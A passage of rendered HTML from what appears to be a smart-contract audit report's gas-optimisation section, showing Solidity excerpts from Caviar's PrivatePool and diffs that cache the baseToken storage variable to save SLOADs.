class=\"mtk11\">InvalidEthAmount</span><span class=\"mtk1\">(); </span><span class=\"mtk3\">// @audit: 1st sload</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">636</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">637</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// transfer the NFT to the borrower</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">638</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">), </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">639</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">640</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// call the borrower</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">641</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\"> =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">642</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">.</span><span class=\"mtk11\">onFlashLoan</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">fee</span><span class=\"mtk1\">, </span><span class=\"mtk12\">data</span><span class=\"mtk1\">) == </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ERC3156FlashBorrower.onFlashLoan&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">643</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">644</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// check that flashloan was successful</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">645</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">success</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">FlashLoanFailed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">646</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">647</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// transfer the NFT from the borrower</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">648</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">649</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">650</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// transfer the fee from the borrower</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">651</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">fee</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// @audit: 2nd &amp; 3rd sload</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"89\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PrivatePool.sol b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 75991e1..c8b3cc1 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -632,7 +632,8 @@ contract PrivatePool is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 fee = flashFee(token, tokenId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // if base token is ETH then check that caller sent enough for the fee</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (baseToken == address(0) &amp;&amp; msg.value &lt; fee) revert InvalidEthAmount();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        address _baseToken = baseToken;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (_baseToken == address(0) &amp;&amp; msg.value &lt; fee) revert InvalidEthAmount();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // transfer the NFT to the borrower</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         ERC721(token).safeTransferFrom(address(this), address(receiver), tokenId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -648,7 +649,7 @@ contract PrivatePool is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         ERC721(token).safeTransferFrom(address(receiver), address(this), tokenId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // transfer the fee from the borrower</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (baseToken != address(0)) ERC20(baseToken).transferFrom(msg.sender, address(this), fee);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (_baseToken != address(0)) ERC20(_baseToken).transferFrom(msg.sender, address(this), fee);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         return success;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L489-L503\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L489-L503</a></p>\n<h3 id=\"cache-basetoken-to-save-3-sloads\" style=\"position:relative;\"><a href=\"#cache-basetoken-to-save-3-sloads\" aria-label=\"cache basetoken to save 3 sloads permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cache <code>baseToken</code> to save 3 SLOADs</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"90\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">489</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> ((</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">baseTokenAmount</span><span class=\"mtk1\">) || (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">))) { </span><span class=\"mtk3\">// @audit: 1st &amp; 2nd sload</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">490</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidEthAmount</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">491</span><span class=\"mtk1\">:        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">492</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">493</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// ~~~ Interactions ~~~ //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">494</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">495</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// transfer the nfts from the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">496</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">497</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">498</span><span class=\"mtk1\">:        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">499</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">500</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) { </span><span class=\"mtk3\">// @audit: 3rd sload</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">501</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// transfer the base tokens from the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">502</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">baseTokenAmount</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// @audit: 4th sload</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">503</span><span class=\"mtk1\">:        }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"91\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PrivatePool.sol b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 75991e1..92349e1 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -486,7 +486,8 @@ contract PrivatePool is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // ensure the caller sent a valid amount of ETH if base token is ETH or that the caller sent 0 ETH if base token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // is not ETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if ((baseToken == address(0) &amp;&amp; msg.value != baseTokenAmount) || (msg.value &gt; 0 &amp;&amp; baseToken != address(0))) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        address _baseToken = baseToken;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if ((_baseToken == address(0) &amp;&amp; msg.value != baseTokenAmount) || (msg.value &gt; 0 &amp;&amp; _baseToken != address(0))) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             revert InvalidEthAmount();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -497,9 +498,9 @@ contract PrivatePool is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             ERC721(nft).safeTransferFrom(msg.sender, address(this), tokenIds[i]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (baseToken != address(0)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (_baseToken != address(0)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // transfer the base tokens from the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            ERC20(baseToken).safeTransferFrom(msg.sender, address(this), baseTokenAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            ERC20(_baseToken).safeTransferFrom(msg.sender, address(this), baseTokenAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L397-L426\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L397-L426</a></p>\n<h3 id=\"cache-basetoken-to-save-3-sloads-1\" style=\"position:relative;\"><a href=\"#cache-basetoken-to-save-3-sloads-1\" aria-label=\"cache basetoken to save 3 sloads 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cache <code>baseToken</code> to save 3 SLOADs</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"92\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">397</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidEthAmount</span><span class=\"mtk1\">(); </span><span class=\"mtk3\">// @audit: 1st sload</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">421</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) { </span><span class=\"mtk3\">// @audit: 2nd sload</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">422</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// transfer the fee amount of base tokens from the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">423</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// @audit: 3rd sload</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">424</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">425</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// if the protocol fee is non-zero then transfer the protocol fee to the factory</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">426</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">factory</span><span class=\"mtk1\">, </span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// @audit: 4th sload</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"93\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PrivatePool.sol b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 75991e1..912790f 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -394,7 +394,8 @@ contract PrivatePool is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // ~~~ Checks ~~~ //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // check that the caller sent 0 ETH if base token is not ETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (baseToken != address(0) &amp;&amp; msg.value &gt; 0) revert InvalidEthAmount();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        address _baseToken = baseToken;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (_baseToken != address(0) &amp;&amp; msg.value &gt; 0) revert InvalidEthAmount();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // check that NFTs are not stolen</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (useStolenNftOracle) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -418,12 +419,12 @@ contract PrivatePool is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // ~~~ Interactions ~~~ //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (baseToken != address(0)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (_baseToken != address(0)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // transfer the fee amount of base tokens from the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            ERC20(baseToken).safeTransferFrom(msg.sender, address(this), feeAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            ERC20(_baseToken).safeTransferFrom(msg.sender, address(this), feeAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // if the protocol fee is non-zero then transfer the protocol fee to the factory</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            if (protocolFeeAmount &gt; 0) ERC20(baseToken).safeTransferFrom(msg.sender, factory, protocolFeeAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if (protocolFeeAmount &gt; 0) ERC20(_baseToken).safeTransferFrom(msg.sender, factory, protocolFeeAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         } else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // check that the caller sent enough ETH to cover the fee amount and protocol fee</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             if (msg.value &lt; feeAmount + protocolFeeAmount) revert InvalidEthAmount();</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L357-L369\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L357-L369</a></p>\n<h3 id=\"cache-basetoken-to-save-2-sloads-1\" style=\"position:relative;\"><a href=\"#cache-basetoken-to-save-2-sloads-1\" aria-label=\"cache basetoken to save 2 sloads 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cache <code>baseToken</code> to save 2 SLOADs</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"94\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">357</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span 